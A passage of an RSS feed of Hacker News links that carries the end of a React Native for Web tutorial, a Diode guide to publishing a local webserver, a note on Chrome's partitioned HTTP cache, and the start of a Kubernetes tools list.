    <span><span><span>&lt;</span>meta</span> <span>charset</span><span><span>=</span><span>"</span>utf-8<span>"</span></span> <span>/&gt;</span></span>
    <span><span><span>&lt;</span>meta</span>
      <span>name</span><span><span>=</span><span>"</span>viewport<span>"</span></span>
      <span>content</span><span><span>=</span><span>"</span>width=device-width, initial-scale=1, shrink-to-fit=no<span>"</span></span>
    <span>/&gt;</span></span>
    <span><span><span>&lt;</span>title</span><span>&gt;</span></span>Your App Title<span><span><span>&lt;/</span>title</span><span>&gt;</span></span>
  <span><span><span>&lt;/</span>head</span><span>&gt;</span></span>

  <span><span><span>&lt;</span>body</span><span>&gt;</span></span>
    <span><span><span>&lt;</span>noscript</span><span>&gt;</span></span>You need to enable JavaScript to run this app.<span><span><span>&lt;/</span>noscript</span><span>&gt;</span></span>
    <span><span><span>&lt;</span>div</span> <span>id</span><span><span>=</span><span>"</span>root<span>"</span></span><span>&gt;</span></span><span><span><span>&lt;/</span>div</span><span>&gt;</span></span>
  <span><span><span>&lt;/</span>body</span><span>&gt;</span></span>
<span><span><span>&lt;/</span>html</span><span>&gt;</span></span></code></pre></div>
<h3>The JavaScript Entry Point</h3>
<p>Create a new <code>index.js</code> file in your <code>src</code> directory:</p>
<div data-language="js"><pre><code><span>import</span> <span>{</span> AppRegistry <span>}</span> <span>from</span> <span>"react-native"</span><span>;</span>
<span>import</span> <span>{</span> App <span>}</span> <span>from</span> <span>"./App.js"</span><span>;</span>

<span>const</span> appName <span>=</span> <span>"Your app name"</span><span>;</span>

AppRegistry<span>.</span><span>registerComponent</span><span>(</span>appName<span>,</span> <span>(</span><span>)</span> <span>=&gt;</span> App<span>)</span><span>;</span>
AppRegistry<span>.</span><span>runApplication</span><span>(</span>appName<span>,</span> <span>{</span>
  
  rootTag<span>:</span> document<span>.</span><span>getElementById</span><span>(</span><span>"root"</span><span>)</span><span>,</span>
<span>}</span><span>)</span><span>;</span></code></pre></div>
<p>This is the entry point of the JavaScript code that will be injected in your HTML file.</p>
<p>You might have noticed that you now have two different <code>index.js</code> files — one at the root of your project, and one in the <code>src</code> directory.</p>
<p>The metro bundler — which is the JavaScript bundler that builds your React Native app — will use the <code>index.js</code> file that you already have at the root of your project for building the Android/iOS app.<br>
Webpack — used under the hood by Create React App — will instead use the new <code>src/index.js</code>.</p>
<blockquote>
<p>To be a bit more explicit on which JS index file is used on a specific platform, I’d suggest renaming the root <code>index.js</code> file to <code>index.native.js</code>. See the <a href="https://reactnative.dev/docs/platform-specific-code#platform-specific-extensions" target="_blank" rel="nofollow noopener noreferrer">official React-Native documentation</a> for more details on the platform-specific extensions.</p>
</blockquote>
<h3>Create The Build Scripts</h3>
<p>To complete the Create React App setup, add two script to your <code>package.json</code> to build your web app:</p>
<div data-language="diff"><pre><code><span><span> </span> "scripts": {
</span><span><span>+</span>  "web:start": "react-scripts start",
<span>+</span>  "web:build": "react-scripts build",
</span>}</code></pre></div>
<h2>Running the Web App</h2>
<p>You can now use <code>npm run web:start</code> to spin-up the development environment of your web app and <code>npm run web:build</code> to create a production build.<br>
The default configuration of Create React App already aliases all <code>react-native</code> imports to <code>react-native-web</code> by default, so you won’t have to worry about manually having to swap them based on the target platform.</p>
<p>That said, unless you’re extremely lucky, you won’t be able to run your React Native app on the web on the first try…</p>
<p>Here’s a list of a few common issues you might face.</p>
<h3>Fixing the Dependency Tree Warning</h3>
<p>The first time you run your web app you’ll probably see the following warning in the console:</p>
<div data-language="text"><pre><code>There might be a problem with the project dependency tree.
It is likely not a bug in Create React App, but something you need to fix locally.

The react-scripts package provided by Create React App requires a dependency:

  "babel-jest": "^26.6.0"

Don't try to install it manually: your package manager does it automatically.
However, a different version of babel-jest was detected higher up in the tree:

  /Users/username/workspace/YourProject/node_modules/babel-jest (version: 25.5.1)

Manually installing incompatible versions is known to cause hard-to-debug issues.

If you would prefer to ignore this check, add SKIP_PREFLIGHT_CHECK=true to an .env file in your project.
That will permanently disable this message but you might encounter other issues.</code></pre></div>
<p>This warning shows up because React Native ships with a version of <code>babel-jest</code> (or other packages, depending on what your warning says) that is different from the one used by Create React App.</p>
<p>The warning itself will point you to several possible fixes.<br>
The two options I would suggest you try are:</p>
<ul>
<li>Ignore this check by adding <code>SKIP_PREFLIGHT_CHECK=true</code> to a <code>.env</code> file at the root of your project. This will force <code>react-script</code> to use the dependency versions set in your <code>package.json</code> instead of the ones required by Create React App. Most of the time these errors are caused by a slightly different version of <code>babel-jest</code> or <code>jest</code> that can still be compatible with the versions you were using in your React Native app — which is why this solution will likely work.</li>
<li>Or uninstall the incriminated dependencies and run again <code>npm install</code> or <code>yarn install</code>. This will make your React Native app use the dependencies shipped with Create React App.</li>
</ul>
<p>Regardless of what choice you make here, this change is one of the things you should <strong>test for regressions when in the future you’ll update your project</strong> to a new version of React Native or <code>react-scripts</code>.</p>
<h3>Resolve Native Module Conflicts</h3>
<p>React Native for Web is compatible with <a href="https://github.com/necolas/react-native-web#components" target="_blank" rel="nofollow noopener noreferrer">many native modules that ship with React Native</a>: <code>Button</code>, <code>Views</code>, <code>TextInput</code>, etc… will be automatically mapped to their web counterparts correctly when imported from <code>react-native</code>.<br>
Unfortunately, using other external native libraries like <a href="https://github.com/zmxv/react-native-sound" target="_blank" rel="nofollow noopener noreferrer"><code>react-native-sound</code></a> or <a href="https://github.com/corbt/react-native-keep-awake" target="_blank" rel="nofollow noopener noreferrer"><code>react-native-keep-awake</code></a> can be a bit hit-and-miss because many native functionalities are not available on the web.</p>
<p>In these cases, your web app will fail to compile with errors such as <code>Module not found</code>.</p>
<p>The <a href="https://reactnative.dev/docs/platform-specific-code" target="_blank" rel="nofollow noopener noreferrer">React Native “Platform Specific Code” documentation</a> has some great tips on how you can run platform-specific code and solve these issues.</p>
<p>My suggestion is to <strong>abstract these native libraries in files with <a href="https://reactnative.dev/docs/platform-specific-code#platform-specific-extensions" target="_blank" rel="nofollow noopener noreferrer">platform-specific extensions</a></strong> so that only the React Native bundler will import them.</p>
<p>For example, assuming you want to use the <code>KeepAwake</code> component exported by the <code>react-native-keep-awake</code> only in your React Native app you should create two files:</p>
<ul>
<li>A file with the code that runs <strong>on the native app</strong> named <code>KeepAwake.native.js</code> that just acts as a proxy for the <code>react-native-keep-awake</code> library:</li>
</ul>
<div data-language="js"><pre><code><span>import</span> KeepAwake <span>from</span> <span>"react-native-keep-awake"</span><span>;</span>
<span>export</span> <span>default</span> KeepAwake<span>;</span></code></pre></div>
<ul>
<li>A file with the code that runs <strong>on the web</strong> named <code>KeepAwake.js</code> that exports a mock/empty component:</li>
</ul>
<div data-language="js"><pre><code><span>import</span> <span>{</span> Fragment <span>}</span> <span>from</span> <span>"react"</span><span>;</span>
<span>export</span> <span>default</span> Fragment<span>;</span></code></pre></div>
<p>By following this strategy you can now import the module ignoring the extension (<code>import KeepAwake from "./KeepAwake";</code>). The right file will be picked up automatically by Create React App and by the React Native bundler.</p>
<blockquote>
<p>You might already be familiar with the <code>.android.js</code> and <code>.ios.js</code> extension. This concept basically acts in the same way, differentiating the code that runs on the web from the one that runs your native app by suffixing the latter with the <code>.native.js</code> extension.</p>
</blockquote>
<h3>Customize Create React App</h3>
<p>Eventually, you might need to customize your project beyond what Create React App allows you to do.
Most of these customizations will probably be just slight changes to the Webpack and Babel configuration of Create React App where <a href="https://create-react-app.dev/docs/alternatives-to-ejecting" target="_blank" rel="nofollow noopener noreferrer">ejecting</a> would be overkill — which is why you might wanna use something like <a href="https://github.com/timarney/react-app-rewired/" target="_blank" rel="nofollow noopener noreferrer"><code>react-app-rewired</code></a>, <a href="https://github.com/arackaf/customize-cra" target="_blank" rel="nofollow noopener noreferrer"><code>customize-cra</code></a>, or <a href="https://github.com/gsoft-inc/craco" target="_blank" rel="nofollow noopener noreferrer"><code>craco</code></a> to apply these changes without ejecting.</p>
<p>One of the first few customizations you’ll want to apply to Create React App, is adding support for the <code>__dev__</code> keyword on the web.
The React Native bundler sets the global <code>__dev__</code> variable to <code>true</code> in development mode when you work on your React Native app, while Create React App uses <code>process.env.NODE_ENV</code> to determine if the web app is running in development/production instead.</p>
<p>To have a unified development experience and make your web app aware of <code>__dev__</code>, we can use <code>react-app-rewired</code> + <code>customize-cra</code> to change the Create React App Webpack configuration, setting the <code>__dev__</code> variable correctly.</p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://mmazzarolo.com/blog/2020-10-24-adding-react-native-web/">https://mmazzarolo.com/blog/2020-10-24-adding-react-native-web/</a></em></p>]]>
            </description>
            <link>https://mmazzarolo.com/blog/2020-10-24-adding-react-native-web/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24894720</guid>
            <pubDate>Mon, 26 Oct 2020 10:51:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Publish a Local Webserver using P2P network]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24894677">thread link</a>) | @punnerud
<br/>
October 26, 2020 | https://support.diode.io/article/ss32engxlq | <a href="https://web.archive.org/web/*/https://support.diode.io/article/ss32engxlq">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                    
          	        <p>
                        <img src="https://files.helpdocs.io/qwk5dmv7m8/other/1600355805491/yahsin-huan.jpg">
                      
                        <span>
                          <span>
                            Updated 1 month ago
                          </span>
                          
                        </span>
                    </p>
                    <p>Diode is the Swiss army knife of Web3 capabilities! One of the neat things it allows you to do is to publish a local website / webserver to the Internet where anyone can view it.</p><p>A common reason for doing this is to allow others to see a website that is under development - the development is done locally and can be viewed by collaborators remotely without setting up a staging server and without any IT tools / configuration. It is much easier and faster to just use Diode to publish your development website so that you can get others' feedback.</p><p>Using this method, you could also host a website long term without requiring a server, static IP address, or ICANN-registered domain name.</p><p>Have fun with this, and let use know in our <a href="https://t.me/diode_chain">Telegram</a> channel if you have any feature requests!</p><h3 id="publish_a_local_website">Publish a Local Website</h3><p>If you already have a website running on port 80 of localhost, <a href="https://support.diode.io/article/lsr4tkzz8t">install Diode</a> and simply run:</p><pre>diode publish <span>-public</span> 80:80</pre><p>This publishes whatever you see at http://localhost:80 to the Diode Network at &lt;client_address&gt;:80. It is accessible on the Internet at https://&lt;client_address&gt;.diode.link.</p><p>The &lt;client_address&gt; can be found in the terminal output, as shown boxed in red below, when the command is ran. The line "Http Gateway Enabled" shows the full external URL - in the case shown below, it is <code>http://0x70114a27f3d1b549012498c69a4120ca4ea11e21.diode.link/</code> You can use that URL to share your website with others.</p><figure><img src="https://files.helpdocs.io/qwk5dmv7m8/articles/ss32engxlq/1599823313774/image.png"></figure><p>If you don't yet have a web server, <a href="https://ghost.org/">Ghost</a> is a good option - see the article about <a href="https://support.diode.io/article/mdelbna1u7">running Ghost on a Raspberry Pi</a>.</p><p>If you are running a service on another port, for example localhost port 2368 (or - Elixir dev server usually uses port 4000, node typically uses port 3000), you can publish it to public port 80 with:</p><pre>diode publish <span>-public</span> 2368:80</pre><h3 id="configure_a_domain_name_with_the_diode_blockchain_name_system_bns">Configure a "Domain Name" with the Diode Blockchain Name System (BNS)</h3><p>In the example above, the URL starts with your globally unique static Client address - a boring sequence of numbers and letters: <code>http://0x70114a27f3d1b549012498c69a4120ca4ea11e21.diode.link/</code>If you want to customize the name, you need to setup a BNS name to map to your address.</p><p>There are two ways to do this:</p><p>1) <a href="https://support.diode.io/article/uec3mloh9z">Configure MetaMask</a> and use the <a href="https://diode.io/prenet/#/dns">Diode Network Explorer</a> (<a href="https://support.diode.io/article/z5h5yx38uj">docs</a>) to reserve a BNS name and link it to your Client address</p><p>2) Use the Diode Client itself to reserve and link:</p><pre>diode bns -register my-example-name</pre><p><span data-hd-color="#fe9200"><strong>IMPORTANT NOTE:</strong> Using the Diode Client to register the BNS name binds the the name to your Client's local wallet. Ensure you keep a backup of your wallet file at ~/.config/diode/private.db so you wonâ€™t lose access to the domain!</span> <span data-hd-color="#000000">If you want one location to manage all your BNS names, use the Diode Network Explorer method (you can use a MetaMask wallet, or hardware wallet, to manage all your BNS names). That allows you to, for example, easily link the BNS name to a different Client address.</span></p><p>Once you've created your BNS name and linked it to your Client address, your website will now be available at https://my-example-name.diode.link. Note that you may need to wait a few minutes for the BNS name to be trusted by the network.</p><h3 id="publish_the_website_securely">Publish the Website Securely</h3><p>If you'd only like certain individuals to access your website, you can use the <code>publish</code> option <code>-private</code>to publish it so that only a single specified Diode address can access it, or the option <code>-protected</code> so that only Diode addresses listed in the same <a href="https://support.diode.io/article/7vyr5mslsy">Fleet Contract</a> can access it. For example:</p><pre>diode publish <span>-</span>private 80:80,&lt;authorized_address&gt;</pre><p>Run <code>diode publish --help</code> for more information.</p><p>When using these modes, each viewer must also be <a href="https://support.diode.io/article/sbf1ihdfve">running the Diode Client as a local gateway</a> so as to authenticate themselves with the Diode Network.</p>
                  </div></div>]]>
            </description>
            <link>https://support.diode.io/article/ss32engxlq</link>
            <guid isPermaLink="false">hacker-news-small-sites-24894677</guid>
            <pubDate>Mon, 26 Oct 2020 10:43:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Say goodbye to resource-caching across sites and domains]]>
            </title>
            <description>
<![CDATA[
Score 74 | Comments 79 (<a href="https://news.ycombinator.com/item?id=24894135">thread link</a>) | @stefanjudis
<br/>
October 26, 2020 | https://www.stefanjudis.com/notes/say-goodbye-to-resource-caching-across-sites-and-domains/ | <a href="https://web.archive.org/web/*/https://www.stefanjudis.com/notes/say-goodbye-to-resource-caching-across-sites-and-domains/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>When I started doing web development, we all loaded jQuery from the official global jQuery CDN.</p><p>The idea was straightforward: if everybody loads the same jQuery script file (<code>cdn.jquery.com/jquery.latest.js</code> – or whatever URL it was back then), then the script file would be cached by the browsers, and other sites requesting the same script would benefit from the speedup of already cached resources. Users would have popular libraries like jQuery already sitting in their browser cache because earlier visited sites requested them.</p><p>This caching behavior was possible because, at the time, the browser's HTTP caches used the asset URL (<code>cdn.jquery.com/jquery.latest.js</code>) as a single cache key. Browsers use cache keys to figure out if and how to cache a resource. If these keys only consist of the resource URL, it allows the reuse of resources across sites and domains.</p><p>All this worked great, but as it is with many great inventions in web technology, <strong>cross-site resource caching enabled new ways to track users across different sites</strong>.</p><p>As an example, let's assume Facebook loads a unique file in their logged-in area (<code>fb-logo-ajgdmaks839–as.svg</code> – I totally made that file path up); if I would know the file path to such a file, request it on <code>stefanjudis.com</code> and see a rapid response coming from the browser cache, I can almost be sure that the user has logged into Facebook lately.</p><h2 id="new-http-cache-keys-in-google-chrome"><a href="#new-http-cache-keys-in-google-chrome">#</a> New HTTP cache keys in Google Chrome</h2><p><a href="https://bugs.webkit.org/show_bug.cgi?id=110269">Webkit (Safari) changed its caching strategy already in 2013</a> to prevent user tracking via the browser cache. Its cache keys are a combination of the requested resource URL and the top-level-domain requesting the resource.</p><p><em>☝️ Big thanks to <a href="https://twitter.com/tomayac/status/1317861511784792067?s=20">Thomas Steiner who gave input on that matter</a>.</em></p><p>On the bright side, this key structure prevents the mentioned tracking possibilities; unfortunately, it also leads to duplicated resources in the browser cache.</p><p>And... it hinders third-party resource sharing across the internet.</p><pre><code>Browsers duplicate resources with different keys:

cdn.jquery.com/jquery.latest.js-amazon.co.uk
cdn.jquery.com/jquery.latest.js-www.stefanjudis.com
</code></pre><p>Starting with v86, Chrome will be using combined cache keys, too. This change means that it's time to say goodbye to third-party resource-sharing across the web. <a href="https://www.statista.com/statistics/544400/market-share-of-internet-browsers-desktop/">With Chrome's market share of roughly 70%</a>, most browsers hitting our sites will use partitioned browser caches from now on. Chrome went for combining the top-level site URL, the current frame site URL, and the resource URL. This approach is more granular than what Safari does, but the result is the same.</p><p>If your sites request the global jQuery, modules from <a href="https://unpkg.com/">unpkg.com</a>, font files from <a href="https://fonts.google.com/">Google fonts</a> or GA's (Google Analytics) <code>analytics.js</code>, <strong>users will redownload the resources no matter if they downloaded and cached them for other sites already.</strong></p><p>What does this change mean for you? If your sites live on modern hosting that provides a CDN and supports HTTP/2, you can drop the third-parties and should ship all resources yourself. Relying on a third-party provides little value in 2020.</p><p>I have mixed feelings about these changes. It's excellent that browsers consider privacy, but it looks like anything can be misused for tracking purposes these days. I wonder where we're going with this... 😢</p><p>If you're interested in learning more on this topic you can give <a href="https://shkspr.mobi/blog/2020/10/please-stop-using-cdns-for-external-javascript-libraries/">Terence Eden's post "Please stop using CDNs for external Javascript libraries"</a> or <a href="https://andydavies.me/blog/2018/09/06/safari-caching-and-3rd-party-resources/">Andy Davies' post "Safari, Caching and Third-Party Resources"</a> a read, too.</p><p>And hey, this post was trending on Hacker News. 🎉 If you're interested, <a href="https://news.ycombinator.com/item?id=24894135">here are the Hacker News comments</a>.</p></div></div>]]>
            </description>
            <link>https://www.stefanjudis.com/notes/say-goodbye-to-resource-caching-across-sites-and-domains/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24894135</guid>
            <pubDate>Mon, 26 Oct 2020 09:07:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Useful Kubernetes Tools for 2020]]>
            </title>
            <description>
<![CDATA[
Score 26 | Comments 18 (<a href="https://news.ycombinator.com/item?id=24893746">thread link</a>) | @sharjeelsayed
<br/>
October 26, 2020 | https://caylent.com/50-useful-kubernetes-tools-for-2020 | <a href="https://web.archive.org/web/*/https://caylent.com/50-useful-kubernetes-tools-for-2020">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
	                    <section>
	                        <div>
	                            
<h3>Updated September 2020</h3>



<h2><span>50+ Useful Kubernetes Tools for 2020 Table of Contents:</span></h2>



<p><strong><a href="#1">Introduction</a></strong></p>



<p><strong><a href="#2">Kube Cluster Deployment Tools</a></strong></p>



<p><strong><a href="#3">Monitoring Tools</a></strong></p>



<p><strong><a href="#4">Testing</a></strong></p>



<p><strong><a href="#5">Security</a></strong></p>



<p><strong><a href="#6">Helpful CLI Tools</a></strong></p>



<p><strong><a href="#7">Development Tools</a></strong></p>



<p><strong><a href="#8">Continuous Integration/ Continuous Delivery Pipeline</a></strong></p>



<p><strong><a href="#9">Serverless/Function Tools</a></strong></p>



<p><strong><a href="#10">Service Mesh Tools</a></strong></p>



<p><strong><a href="#11">Native Service Discovery</a></strong></p>



<p><strong><a href="#12">Native Visualization &amp; Control</a></strong></p>



<p><strong><a href="#13">Cost Management</a></strong></p>







<h2><a id="1"></a>Introduction</h2>



<p>In the last few years, Kubernetes has laid waste to its fellow competitors in the battlefield of container orchestration. Sadly, Docker Swarm hasn’t been a major contender since 2016 and, like AWS, admitted defeat by pledging K8s support and integration.</p>



<p><span>Since Kubernetes has skyrocketed to popularity as the container solution of choice, here’s a comprehensive list of all the tools that complement K8s to further enhance your development work.</span></p>



<p>Also, check out<a href="https://caylent.com/50-useful-kubernetes-tools-list%20for%202020-part-2" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener"> part 2</a> of our most useful Kubernetes Tools</p>



<h2><b><a id="2"></a>Kube Cluster Deployment </b></h2>



<figure><img src="https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2018/05/1-Kubespray-small.png" alt="#Kubespray" width="155" height="155" srcset="https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2018/05/1-Kubespray-small.png 129w, https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2018/05/1-Kubespray-small-100x100.png 100w" sizes="(max-width: 155px) 100vw, 155px" data-srcset="https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2018/05/1-Kubespray-small.png 129w, https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2018/05/1-Kubespray-small-100x100.png 100w" data-src="https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2018/05/1-Kubespray-small.png" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><figcaption>
						</figcaption></figure>







<h2><b>1. Kubespray</b></h2>



<p><span>Kubespray provides a set of Ansible roles for Kubernetes deployment and configuration. Kubespray can use AWS, GCE, Azure, OpenStack or a bare metal Infrastructure as a Service (IaaS) platform. Kubespray is an open-source project with an open development model. The tool is a good choice for people who already know Ansible as there’s no need to use another tool for provisioning and orchestration. Kubespray uses kubeadm under the hood.</span></p>



<p><a><span>Link:</span></a><a href="https://github.com/kubernetes-incubator/kubespray" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener"> <span>https://github.com/kubernetes-incubator/kubespray</span></a></p>



<p><span>Cost: Free</span></p>



<figure><img src="https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2018/08/mini-kube.png" alt="#Minikube" width="169" height="164" srcset="https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2018/08/mini-kube.png 300w, https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2018/08/mini-kube-100x97.png 100w" sizes="(max-width: 169px) 100vw, 169px" data-srcset="https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2018/08/mini-kube.png 300w, https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2018/08/mini-kube-100x97.png 100w" data-src="https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2018/08/mini-kube.png" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><figcaption>						</figcaption></figure>



<h3><b>2. Minikube</b></h3>



<p><span>Minikube allows you to install and try out Kubernetes locally. The tool is a good starting point for Kubernetes exploration. Easily launch a single-node Kubernetes cluster inside a virtual machine (VM) on your laptop. Minikube is available on Windows, Linux, and OSX. In just 5 minutes you will be able to explore Kubernetes’ main features. Launch the Minikube dashboard straight-from-the-box with just one command.</span></p>



<p><span>Link:</span><a href="https://github.com/kubernetes/minikube" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener"> <span>https://github.com/kubernetes/minikube</span></a></p>



<p><span>Cost: Free</span></p>



<h3><b>3. Kubeadm</b></h3>



<p><span>Kubeadm is a Kubernetes distribution tool since version 1.4. The tool helps to bootstrap best-practice Kubernetes clusters on existing infrastructure. Kubeadm cannot provision infrastructure for you though. Its main advantage is the ability to launch minimum viable Kubernetes clusters anywhere. Add-ons and networking setup are both out of Kubeadm’s scope though, so you will need to install this manually or using another tool.</span></p>



<p><span>Link:</span><a href="https://github.com/kubernetes/kubeadm" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener"> <span>https://github.com/kubernetes/kubeadm</span></a></p>



<p><span>Cost: Free</span></p>



<h3><b>4. Kops</b></h3>



<p><span>Kops helps you create, destroy, upgrade, and maintain production-grade, highly available Kubernetes clusters from the command line. Amazon Web Services (AWS) is currently officially supported, with GCE in beta support, and VMware vSphere in alpha, and other platform support is planned. Kops allows you to control the full Kubernetes cluster lifecycle; from infrastructure provisioning to cluster deletion.</span></p>



<p><span>Link:</span><a href="https://github.com/kubernetes/kops" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener"> <span>https://github.com/kubernetes/kops</span></a></p>



<p><span>Cost: Free</span></p>



<h3><b>5. Bootkube</b></h3>



<p><span>Bootkube is a great tool for launching self-hosted Kubernetes clusters. It helps you set up a temporary Kubernetes control plane which will operate until the self-hosted control-plane is able to handle requests.</span></p>



<p><span>Link:</span><a href="https://github.com/kubernetes-incubator/bootkube" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener"> <span>https://github.com/kubernetes-incubator/bootkube</span></a></p>



<p><span>Cost: Free</span></p>



<figure><img src="https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2018/05/6-Kube-aws.png" alt="Kubernetes on AWS (#KubeAWS)" width="229" height="164" data-src="https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2018/05/6-Kube-aws.png" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><figcaption>
						</figcaption></figure>



<h3><b>6. Kubernetes on AWS (Kube-AWS)</b></h3>



<p><span>Kube-AWS is a console tool provided by CoreOS which deploys a fully-functional Kubernetes cluster using AWS CloudFormation. Kube-AWS allows you to deploy a traditional Kubernetes cluster and automatically provision every K8s service with native AWS features (e.g., ELB, S3, and Auto Scaling, etc.).</span></p>



<p><span>Link:</span><a href="https://github.com/kube-aws/kube-aws" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener"> <span>https://github.com/kubernetes-incubator/kube-aws</span></a></p>



<p><span>Cost: Free</span></p>



<figure><img src="https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2018/05/pubRLhkD_400x400.png" alt="#JAAS" width="188" height="188" srcset="https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2018/05/pubRLhkD_400x400.png 240w, https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2018/05/pubRLhkD_400x400-100x100.png 100w" sizes="(max-width: 188px) 100vw, 188px" data-srcset="https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2018/05/pubRLhkD_400x400.png 240w, https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2018/05/pubRLhkD_400x400-100x100.png 100w" data-src="https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2018/05/pubRLhkD_400x400.png" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><figcaption>0</figcaption></figure>



<h3><b>7. JAAS</b></h3>



<p><span>JAAS, is Juju as a service which simplifies how you configure, scale and operate today’s complex software. Juju deploys everywhere: to public or private clouds. JAAS deploys your workload to your cloud of choice.</span></p>



<p><span>Link:</span><a href="https://jaas.ai/" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener"> <span>https://jaas.ai/</span></a></p>



<figure><img src="https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2018/05/conjureup.jpg" alt="#conjure-up" width="352" height="74" srcset="https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2018/05/conjureup.jpg 411w, https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2018/05/conjureup-100x21.jpg 100w" sizes="(max-width: 352px) 100vw, 352px" data-srcset="https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2018/05/conjureup.jpg 411w, https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2018/05/conjureup-100x21.jpg 100w" data-src="https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2018/05/conjureup.jpg" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><figcaption>
						</figcaption></figure>



<h3><b>8. Conjure-up</b></h3>



<p><span>Conjure-up is another Canonical product which allows you to deploy “The Canonical Distribution of Kubernetes on Ubuntu” with a few simple commands. It supports AWS, GCE, Azure, Joyent, OpenStack, VMware, bare metal, and localhost deployments. Juju, MAAS, and LXD are the underlying technology for Conjure-up.</span></p>



<p><span>Link:</span><a href="https://conjure-up.io/" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener"> <span>https://conjure-up.io/</span></a></p>



<p><span>Cost: Free</span></p>



<figure><img src="https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2018/05/download-2.png" alt="#AmazonEKS" srcset="https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2018/05/download-2.png 318w, https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2018/05/download-2-100x50.png 100w" sizes="(max-width: 318px) 100vw, 318px" data-srcset="https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2018/05/download-2.png 318w, https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2018/05/download-2-100x50.png 100w" data-src="https://2wded2jn6ekmzt6b3ruvnh15-wpengine.netdna-ssl.com/wp-content/uploads/2018/05/download-2.png" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></figure>



<h3><b>9. Amazon EKS</b></h3>



<p><span>Amazon Elastic Container Service for Kubernetes (</span><i><span>Amazon EKS</span></i><span>) is a managed service which makes it simple to deploy, manage, and scale containerized applications using Kubernetes. Amazon EKS manages your Kubernetes infrastructure across multiple AWS Availability Zones, while automatically detecting and replacing unhealthy control plane nodes, and providing on-demand upgrades and patching. You simply provision worker nodes and connect them to the provided Amazon EKS <a id="3"></a>endpoint<a>.</a></span></p>



<p><a><br><span>Link:</span></a><a href="https://aws.amazon.com/eks/" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener"> <span>https://aws.amazon.com/eks/</span></a></p>



